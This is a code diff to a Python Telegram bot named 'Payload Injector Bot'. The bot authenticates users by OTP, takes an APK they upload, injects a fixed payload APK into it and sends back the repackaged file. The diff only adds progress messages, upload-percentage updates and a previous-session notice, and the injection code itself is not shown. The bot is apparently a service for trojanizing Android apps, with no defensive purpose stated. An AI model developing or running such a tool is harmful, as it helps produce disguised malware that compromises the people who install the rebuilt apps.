@@ -132,13 +132,15 @@ async def handler(event):
             success, service_token, msg = verify_otp(username, text)
 
             if success:
-                user_manager.save_user(user_id, username, service_token)
+                replaced = user_manager.save_user(user_id, username, service_token)
                 del user_manager.waiting_otp[user_id]
-                await event.reply(
-                    "✅ **Authentication Successful!**\n\n"
-                    "🎯 **Payload Injector Bot**\n\n"
-                    "📤 Send me an APK file to inject!"
-                )
+                
+                message = "✅ **Authentication Successful!**\n\n"
+                if replaced:
+                    message += "⚠️ Previous session deactivated\n\n"
+                message += "🎯 **Payload Injector Bot**\n\n📤 Send me an APK file to inject!"
+                
+                await event.reply(message)
             else:
                 await event.reply(f"❌ {msg}\n\n📝 Please send your username again")
                 del user_manager.waiting_otp[user_id]
@@ -226,12 +228,6 @@ async def process_payload_injection(event, user_id, message):
             progress_callback=progress_callback
         )
 
-        await msg.edit(
-            "🔄 **Processing...**\n\n"
-            "⚙️ Step 1/6: Decompiling payload...\n"
-            "⏳ Please wait..."
-        )
-
         file_size_mb = file_size / (1024 * 1024)
 
         if telegram_logger:
@@ -245,8 +241,21 @@ async def process_payload_injection(event, user_id, message):
         os.makedirs(builds_dir, exist_ok=True)
         output_apk = os.path.join(builds_dir, f"payload_{user_id}_{timestamp}.apk")
 
+        async def injection_progress(step_text):
+            await msg.edit(
+                f"🔄 **Processing**\n\n"
+                f"{step_text}\n"
+                f"⏳ Please wait..."
+            )
+
         injector = PayloadInjector(PAYLOAD_APK)
-        final_apk_path, error, duration = await injector.inject(user_apk_path, output_apk, user_id, username)
+        final_apk_path, error, duration = await injector.inject(
+            user_apk_path, 
+            output_apk, 
+            user_id, 
+            username,
+            progress_callback=injection_progress
+        )
 
         if error or not final_apk_path:
             if telegram_logger:
@@ -264,14 +273,27 @@ async def process_payload_injection(event, user_id, message):
 
         final_size = os.path.getsize(final_apk_path)
 
+        last_upload_update = [0]
+        
+        async def upload_progress_callback(current, total):
+            progress = (current / total) * 100
+            if progress - last_upload_update[0] >= 10:
+                last_upload_update[0] = progress
+                await msg.edit(
+                    f"✅ **Processing Complete**\n\n"
+                    f"📤 Uploading: {progress:.1f}%\n"
+                    f"⬆️ {format_size(current)} / {format_size(total)}"
+                )
+
         await msg.edit(
-            "✅ **Injection Complete!**\n\n"
-            "📤 Uploading final APK..."
+            "✅ **Processing Complete**\n\n"
+            "📤 Uploading..."
         )
 
         uploaded_file = await upload_file(
             client=bot,
-            file=final_apk_path
+            file=final_apk_path,
+            progress_callback=upload_progress_callback
         )
         
         await bot.send_file(
